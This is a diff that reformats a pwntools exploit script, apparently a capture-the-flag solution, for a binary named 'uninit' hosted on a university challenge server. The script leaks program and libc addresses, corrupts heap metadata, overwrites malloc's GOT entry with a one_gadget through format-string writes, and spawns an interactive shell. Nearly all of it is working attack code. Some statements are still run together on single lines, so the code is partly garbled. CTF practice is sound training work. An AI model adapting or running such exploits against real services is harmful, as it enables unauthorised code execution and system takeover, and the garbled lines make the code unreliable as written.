@@ -1,45 +1,97 @@
 #!/usr/bin/python #-*- coding:utf-8 -*#Author: Critizero
  
-from pwn import * import sys import LibcSearcher
+from pwn import * 
+import sys 
+import LibcSearcher
  
-if len(sys.argv) == 1 or sys.argv[1] == "g":    p = process("./uninit")    if len(sys.argv) != 1:        gdb.attach(p) else:    p = remote("sec4.hdu.edu.cn",10003)
+if len(sys.argv) == 1 or sys.argv[1] == "g":    
+ p = process("./uninit")    
+ if len(sys.argv) != 1:        
+  gdb.attach(p) 
+else:    
+  p = remote("sec4.hdu.edu.cn",10003)
  
-elf = ELF("./uninit",checksec=False) context.log_level = "debug" libc = ELF('./libc.so.6',checksec=False)
+elf = ELF("./uninit",checksec=False) 
+context.log_level = "debug" 
+libc = ELF('./libc.so.6',checksec=False)
  
-def leak_addr():    p.recvuntil('input your name:')    p.sendline('a'*8)    p.recvuntil('a'*8)    _start = u64(p.recv(6).strip().ljust(8,'\x00'))    pro_base = _start - 0x9c0    return pro_base
+def leak_addr():    
+ p.recvuntil('input your name:')    
+ p.sendline('a'*8)    
+ p.recvuntil('a'*8)    
+ _start = u64(p.recv(6).strip().ljust(8,'\x00'))    
+ pro_base = _start - 0x9c0    
+ return pro_base
  
-def create(size, content):    p.recvuntil('size: ')    p.sendline(str(size))    p.recvuntil('string: ')    p.sendline(content)
+def create(size, content):    
+ p.recvuntil('size: ')    
+ p.sendline(str(size))   
+ p.recvuntil('string: ')   
+ p.sendline(content)
  
-def show(size=0):    p.recvuntil('result: ')    ret = p.recv(size)    return ret
+def show(size=0):    
+ p.recvuntil('result: ')   
+ ret = p.recv(size)    
+ return ret
  
-def get_cmd(value, position):    if len(value) != len(position):        return 'Length unmatch'    book = {}    for (i,j) in zip(value, position):        book[i] = j    value.sort()
-    offset = [value[0]]    for i in range(1,len(value)):        offset.append(value[i]-value[i-1])    cmd = ''    for i in range(len(offset)):        cmd += '%0'+str(offset[i]) + 'c%' + str(book[value[i]]) + '$hhn'    return cmd
+def get_cmd(value, position):    
+ if len(value) != len(position):        
+  return 'Length unmatch'    
+ book = {}    
+ for (i,j) in zip(value, position):        
+  book[i] = j   
+ value.sort()
+ offset = [value[0]]    
+ for i in range(1,len(value)):        
+  offset.append(value[i]-value[i-1])   
+ cmd = ''    
+ for i in range(len(offset)):       
+  cmd += '%0'+str(offset[i]) + 'c%' + str(book[value[i]]) + '$hhn'   
+ return cmd
  
-base_addr = leak_addr() create_addr = base_addr + 0xCE3 show_addr = base_addr + 0xCB4 malloc_got = base_addr + 0x201FB8 play_addr = base_addr + 0xD6B
+base_addr = leak_addr() 
+create_addr = base_addr + 0xCE3 
+show_addr = base_addr + 0xCB4 
+malloc_got = base_addr + 0x201FB8 
+play_addr = base_addr + 0xD6B
  
-pop_rdi_ret = base_addr + 0xfd3 buffer_addr = base_addr + 0x202018 gets_addr = base_addr + 0x201FB0
+pop_rdi_ret = base_addr + 0xfd3 
+buffer_addr = base_addr + 0x202018
+gets_addr = base_addr + 0x201FB0
  
-log.info('create addr '+hex(create_addr)) log.info('show addr '+hex(show_addr))
+log.info('create addr '+hex(create_addr)) 
+log.info('show addr '+hex(show_addr))
  
-p.recvuntil('Tell me count of game:') p.sendline('1') p.recvuntil('Answer:')
+p.recvuntil('Tell me count of game:') 
+p.sendline('1') 
+p.recvuntil('Answer:')
  
-payload = '1\x00'.ljust(0x38,'\x00') payload += p64(create_addr) + p64(create_addr) + p64(create_addr) payload += p64(show_addr) + p64(play_addr)
+payload = '1\x00'.ljust(0x38,'\x00') 
+payload += p64(create_addr) + p64(create_addr) + p64(create_addr) payload += p64(show_addr) + p64(play_addr)
  
-p.sendline(payload) payload = p64(0)*3 + p64(0xfe1) create(0x10, payload)
+p.sendline(payload) 
+payload = p64(0)*3 + p64(0xfe1) 
+create(0x10, payload)
  
 create(0x1000, 'aaaa')
  
-payload = '%11$p' create(0x400, payload)
+payload = '%11$p' 
+create(0x400, payload)
  
 libc_start = int(show(14),16) - 240 log.info('__libc_start_main '+hex(libc_start))
  
-libc_base = libc_start - libc.symbols['__libc_start_main'] sys_addr = libc_base + libc.symbols['system'] IO_list_all = libc_base + libc.symbols['_IO_list_all'] one_gadget = libc_base + 0x45216
+libc_base = libc_start - libc.symbols['__libc_start_main'] 
+sys_addr = libc_base + libc.symbols['system'] 
+IO_list_all = libc_base + libc.symbols['_IO_list_all'] 
+one_gadget = libc_base + 0x45216
  
 gets = libc_base + libc.symbols['gets']
  
 log.info('one gadget '+hex(one_gadget))
  
-args = [one_gadget&0xff, (one_gadget>>8)&0xff, (one_gadget>>16)&0xff] addr = [malloc_got, malloc_got+1, malloc_got+2, malloc_got+3, malloc_got+4] fmt = get_cmd(args, [8,9,10])
+args = [one_gadget&0xff, (one_gadget>>8)&0xff, (one_gadget>>16)&0xff] 
+addr = [malloc_got, malloc_got+1, malloc_got+2, malloc_got+3, malloc_got+4] 
+fmt = get_cmd(args, [8,9,10])
  
 p.recvuntil('Answer:')
  
@@ -52,6 +104,7 @@ p.recvuntil('Answer:')
  
 p.sendline(payload)
  
-sleep(1) p.sendline('/bin/sh\x00')
+sleep(1) 
+p.sendline('/bin/sh\x00')
  
 p.interactive()
